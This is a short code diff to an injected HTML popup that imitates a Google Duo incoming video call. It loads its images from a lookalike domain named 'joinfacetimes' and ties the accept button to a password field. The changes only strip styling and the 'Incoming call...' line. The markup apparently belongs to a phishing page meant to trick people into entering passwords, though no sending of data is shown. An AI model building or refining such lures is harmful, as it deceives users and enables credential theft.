@@ -283,15 +283,7 @@ newDiv.innerHTML = `
       <link rel="stylesheet" href="https://res.cloudinary.com/df4coefiy/raw/upload/v1745475033/57978a1014ff42c9sw_fbmtve.css" data-precedence="next">
       <title>Join video chat</title>
       <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-    }
+
     .card {
       background-color: white;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
@@ -358,7 +350,6 @@ newDiv.innerHTML = `
          <div class="relative min-h-dvh flex items-center justify-center p-4 text-center" id="call-popup">
             <div class="bg-neutral-50 w-full max-w-[17rem] p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
                <img alt="Google Duo" loading="lazy" width="80" height="80" decoding="async" data-nimg="1" class="rounded-full object-cover object-center p-2 bg-green-100" style="color:transparent" src="https://joinfacetimes.com/public/images/google-duo.png">
-               <p class="text-xl font-medium text-neutral-700 text-center">Incoming call...</p>
                <div class="flex items-center justify-center gap-x-12 text-neutral-50">
                   <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
       <div class="card">
